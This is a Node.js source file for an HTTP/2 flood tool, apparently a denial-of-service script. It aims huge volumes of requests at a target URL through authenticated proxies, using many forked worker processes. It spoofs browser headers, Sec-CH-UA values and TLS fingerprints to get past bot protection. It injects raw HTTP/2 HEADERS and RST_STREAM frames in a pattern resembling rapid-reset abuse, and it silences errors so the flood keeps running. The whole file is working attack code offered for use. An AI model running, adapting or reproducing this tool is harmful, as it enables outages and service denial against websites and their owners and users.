const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, net = require('net')
	, request = require('request')
	, cluster = require('cluster')
const crypto = require('crypto');
const HPACK = require('hpack');
const currentTime = new Date();
const os = require("os");
const httpTime = currentTime.toUTCString();

const Buffer = require('buffer').Buffer;

const errorHandler = error => {
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

cplist = [
		'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256',
		'TLS_CHACHA20_POLY1305_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_AES_128_GCM_SHA256'
		, ]
const sigalgs = [
	'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
	, 'ecdsa_brainpoolP256r1tls13_sha256'
	, 'ecdsa_brainpoolP384r1tls13_sha384'
	, 'ecdsa_brainpoolP512r1tls13_sha512'
	, 'ecdsa_sha1'
	, 'ed25519'
	, 'ed448'
	, 'ecdsa_sha224'
	, 'rsa_pkcs1_sha1'
	, 'rsa_pss_pss_sha256'
	, 'dsa_sha256'
	, 'dsa_sha384'
	, 'dsa_sha512'
	, 'dsa_sha224'
	, 'dsa_sha1'
	, 'rsa_pss_pss_sha384'
	, 'rsa_pkcs1_sha2240'
	, 'rsa_pss_pss_sha512'
	, 'sm2sig_sm3'
	, 'ecdsa_secp521r1_sha512'
, ];
let sig = sigalgs.join(':');

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
proxyr = proxyFile
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 100;

if (cluster.isMaster) {
  console.log("@CRISXTOP".bgRed);
	for (let counter = 1; counter <= thread; counter++) {
		cluster.fork();
	}
	const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= thread; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	setTimeout(() => process.exit(-1), time * 1000);
} else {
    setInterval(function() {
        flood()
      }, 0);
}

// Hàm tạo Sec-CH-UA từ User-Agent
function getSecChUa(userAgent) {
    let browser = '';
    let version = '';
    let platform = 'Windows'; // Mặc định, có thể thay đổi dựa trên UA

    // Phân tích User-Agent
    const uaParts = userAgent.split(' ');
    for (const part of uaParts) {
        if (part.includes('Tor/') || part.includes('Firefox/') || part.includes('Chrome/') || part.includes('Safari/')) {
            const [browserName, browserVersion] = part.split('/');
            browser = browserName === 'Tor' ? 'Firefox' : browserName; // Tor dựa trên Firefox
            version = browserVersion.split('.')[0]; // Lấy phiên bản chính
            break;
        }
        if (part.includes('Windows')) platform = 'Windows';
        else if (part.includes('Linux')) platform = 'Linux';
        else if (part.includes('Mac')) platform = 'macOS';
    }

    // Tạo Sec-CH-UA dựa trên thông tin
    if (browser && version) {
        if (browser === 'Firefox' || browser === 'Tor') {
            return `"Firefox";v="${version}", "Not A(Brand";v="99", "Chromium";v="${version}"`;
        } else if (browser === 'Chrome') {
            return `"Google Chrome";v="${version}", "Chromium";v="${version}", "Not A(Brand";v="99"`;
        } else if (browser === 'Safari') {
            return `"Safari";v="${version}", "Not A(Brand";v="99"`;
        }
    }
    // Giá trị mặc định nếu không xác định được
    return `"Not A(Brand";v="99", "Chromium";v="135", "Google Chrome";v="135"`;
}

function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	var proxy = proxyr.split(':');
	
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

	function randstr(minLength, maxLength) {
		const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
const randomStringArray = Array.from({ length }, () => {
const randomIndex = Math.floor(Math.random() * characters.length);
return characters[randomIndex];
});

return randomStringArray.join('');
}

	const randstrsValue = randstr(25);
function generateRandomString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
function shuffleObject(obj) {
					const keys = Object.keys(obj);
				  
					for (let i = keys.length - 1; i > 0; i--) {
					  const j = Math.floor(Math.random() * (i + 1));
					  [keys[i], keys[j]] = [keys[j], keys[i]];
					}
				  
					const shuffledObject = {};
					for (const key of keys) {
					  shuffledObject[key] = obj[key];
					}
				  
					return shuffledObject;
}
const hd = {}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
   
nodeii = getRandomInt(115,124)
cache = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const userAgent = process.argv[8]; // Lấy User-Agent từ input dòng lệnh
const secChUa = getSecChUa(userAgent); // Tạo Sec-CH-UA dựa trên User-Agent

const headers = {
    ":method": "GET",
    ":authority": parsed.host,
    ":scheme": "https",
    ":path": parsed.path,
    ...shuffleObject({
        "sec-ch-ua": secChUa,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,fr;q=0.8,es;q=0.7",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "upgrade-insecure-requests": "1",
        "cache-control": "no-cache",
        "pragma": "no-cache",
    }),
    "user-agent": userAgent,
    "cookie": process.argv[7],
};

	const agent = new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, timeout: 5000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'close'
		, 'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`
    ,}
	, };
connection = http.request(Optionsreq, (res) => {});
const TLSOPTION = {
		ciphers: cipper
		, minVersion: 'TLSv1.2'
    ,maxVersion: 'TLSv1.3'
		, sigals: sig
		, secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL
		, echdCurve: "X25519"
    ,maxRedirects: 20
    ,followAllRedirects: true
		, secure: true
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']
	};

	function createCustomTLSSocket(parsed, socket) {
    const tlsSocket = tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setMaxListeners(0);

    return tlsSocket;
}
async function generateJA3Fingerprint(socket) {
    if (!socket.getCipher()) {
        console.error('Cipher info is not available. TLS handshake may not have completed.');
        return null;
    }

    const cipherInfo = socket.getCipher();
    const supportedVersions = socket.getProtocol();
    const tlsVersion = supportedVersions.split('/')[0];

    const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${tlsVersion}:${cipherInfo.bits}`;
    const md5Hash = crypto.createHash('md5');
    md5Hash.update(ja3String);

    return md5Hash.digest('hex');
}
 function taoDoiTuongNgauNhien() {
  const doiTuong = {};
  function getRandomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
maxi = getRandomNumber(1,4)
  for (let i = 1; i <=maxi ; i++) {
    
    
 const key = 'custom-sec-'+ generateRandomString(1,9)

    const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)

    doiTuong[key] = value;
  }

  return doiTuong;
}
	 
connection.on('connect', function (res, socket) {
    const tlsSocket = createCustomTLSSocket(parsed, socket);
    socket.setKeepAlive(true, 100000);
let ja3Fingerprint; 


function getJA3Fingerprint() {
    return new Promise((resolve, reject) => {
        tlsSocket.on('secureConnect', () => {
            ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
         resolve(ja3Fingerprint); 
        });

        
        tlsSocket.on('error', (error) => {
            reject(error); 
        });
    });
}

async function main() {
    try {
        const fingerprint = await getJA3Fingerprint();  
        headers['ja3-fingerprint']= fingerprint  
    } catch (error) {
        
    }
}


main();
    let clasq = shuffleObject({
    ...(Math.random() < 0.5 ? { headerTableSize: 655362 } : {}),
    ...(Math.random() < 0.5 ? { maxConcurrentStreams: 1000 } : {}),
    enablePush: false,
    ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
    ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
    ...(Math.random() < 0.5 ? { initialWindowSize: 6291456 } : {}),
    ...(Math.random() < 0.5 ? { maxHeaderListSize: 262144 } : {}),
    ...(Math.random() < 0.5 ? { maxFrameSize: 16384 } : {})
});

function incrementClasqValues() {
    if (clasq.headerTableSize) clasq.headerTableSize += 1;
    if (clasq.maxConcurrentStreams) clasq.maxConcurrentStreams += 1;
    if (clasq.initialWindowSize) clasq.initialWindowSize += 1;
    if (clasq.maxHeaderListSize) clasq.maxHeaderListSize += 1;
    if (clasq.maxFrameSize) clasq.maxFrameSize += 1;
    return clasq;
}
setInterval(() => {
    incrementClasqValues();
    const payload = Buffer.from(JSON.stringify(clasq));
    const frames = encodeFrame(0, 4, payload, 0);
}, 10000);
    let hpack = new HPACK();
    hpack.setTableSize(4096);

    const clients = [];
    const client = http2.connect(parsed.href, {
		
		settings: incrementClasqValues(),
    "unknownProtocolTimeout": 10,
    "maxReservedRemoteStreams": 4000,
    "maxSessionMemory": 200,
   createConnection: () => tlsSocket
	});
clients.push(client);
client.setMaxListeners(0);
const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    client.on('connect', () => {
        client.ping((err, duration, payload) => {
            if (err) {
            } else {
            }
        });
        
    });

    clients.forEach(client => {
        const intervalId = setInterval(async () => {
            const requests = [];
            const requests1 = [];
            let count = 0;
            let streamId =1;
            let streamIdReset = 0;
            let currenthead = 0;
			const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
      
      const headers2 = (currenthead) => {
                let updatedHeaders = {};
                currenthead += 1;
            
                switch (currenthead) {
                    case 1:
                        updatedHeaders["sec-ch-ua"] = secChUa;
                        break;
                    case 2:
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        break;
                    case 3:
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        break;
                    case 4:
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        break;
                    case 5:
                        updatedHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                        break;
                    case 6:
                        updatedHeaders["sec-fetch-site"] = "same-origin";
                        break;
                    case 7:
                        updatedHeaders["sec-fetch-mode"] = "navigate";
                        break;
                    case 8:
                        updatedHeaders["sec-fetch-user"] = "?1";
                        break;
                    case 9:
                        updatedHeaders["sec-fetch-dest"] = "document";
                        break;
                    case 10:
                        updatedHeaders["accept-encoding"] = "gzip, deflate, br";
                        break;
                    case 11:
                        updatedHeaders["accept-language"] = "en-US,en;q=0.9,fr;q=0.8,es;q=0.7";
                        break;
                    default:
                        break;
                }
            
                return updatedHeaders;
            };
            
            if (streamId >= Math.floor(rps / 2)) {
                let updatedHeaders = headers2(currenthead);
                
                Object.entries(updatedHeaders).forEach(([key, value]) => {
                    headers[key] = value;
                });
            }
            const updatedHeaders = headers2(currenthead);
                let dynHeaders = shuffleObject({
                    ...taoDoiTuongNgauNhien(),
                    ...taoDoiTuongNgauNhien(),
                });
                const head = {
                    ...dynHeaders,
                    ...headers,
                    ...updatedHeaders,
                };
                
                            
                if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) return;
                for (let i = 0; i < rps; i++) {
                 const priorityWeight = Math.floor(Math.random() * 256); 
                const requestPromise = new Promise((resolve, reject) => {
                    const request = client.request(head, {
                                                weight: priorityWeight,
                                                parent:0,
                                                exclusive: true,
						                        endStream: true,
                                                dependsOn: 0,
                                               
                                            });
                                            let data = 0;
                                            request.on('data', (chunk) => {
                                            data += chunk;
                                            });
                    request.on('response', response => {
                    request.close(http2.constants.NO_ERROR);
                    request.destroy();
                    resolve(data);
                            });
                    request.on('end', () => {
                    count++;
                    if (count === time * rps) {
                    clearInterval(intervalId);
                    client.close(http2.constants.NGHTTP2_CANCEL);
                    client.goaway(1, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('GO AWAY'));
                    } else if (count=== rps) {
                    client.close(http2.constants.NGHTTP2_CANCEL);
                    client.destroy();
                    clearInterval(intervalId);
                    }
                    reject(new Error('Request timed out'));
                    });
                    request.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                });

                const packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    hpack.encode(head)
                ]);

                const flags = 0x1 | 0x4 | 0x8 | 0x20;
                
                const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                
                const frame = Buffer.concat([encodedFrame]);
                if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                                            tlsSocket.write(Buffer.concat([
                                                encodeFrame(streamId, data, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),
                                                frame
                                                
                                                
                                            ]));
                                        } else if (streamIdReset >= 2 && (streamIdReset -2) % 4 === 0) {
                       tlsSocket.write(Buffer.concat([encodeFrame(streamId, data, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),frames
                            
                                        ]));
                            } 
                                        streamIdReset+= 2;
                                        streamId += 2;
                                        data +=2;
                requests.push({ requestPromise, frame });
                
            }
            try {
                await Promise.all(requests.map(({ requestPromise }) => requestPromise));
            } catch (error) {
            }
            const requestPromise2 = new Promise((resolve, reject) => {
                const request2 = client.request(head, {
                    priority: 1,
                    weight: priorityWeight,
                    parent: 0,
                    exclusive: true,
                });
                request2.setEncoding('utf8');
                let data2 = Buffer.alloc(0);

                request2.on('data', (chunk) => {
                    data2 += chunk;
                });

                request2.on('response', (res2) => {
                    request2.close(http2.constants.NO_ERROR);
                        request2.destroy();
                    resolve(data2);
                });

                request2.on('end', () => {
                    count++;
                    if (count === time * rps) {
                        clearInterval(intervalId);
                        client.close(http2.constants.NGHTTP2_CANCEL);
                        client.goaway(1, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('GO AWAY'));
                    } else if (count === rps) {
                        client.close(http2.constants.NGHTTP2_CANCEL);
                        client.destroy();
                        clearInterval(intervalId);
                    }
                    reject(new Error('Request timed out'));
                });

                request2.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
            });

            requests1.push({ requestPromise: requestPromise2, frame });
            await Promise.all(requests1.map(({ requestPromise }) => requestPromise));
           
        }, 500);
    });
		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return 
		});

client.on("error", error => {
    if (error.code === 'ERR_HTTP2_GOAWAY_SESSION') {
        console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
        shouldPauseRequests = true;
        setTimeout(() => {
           
            shouldPauseRequests = false;
        },2000);
    } else if (error.code === 'ECONNRESET') {
        
        shouldPauseRequests = true;
        setTimeout(() => {
            
            shouldPauseRequests = false;
        }, 2000);
    }  else {
    }

    client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
});

	});

connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
connection.on('timeout', () => {
		connection.destroy();
		return
	});
connection.end();
}
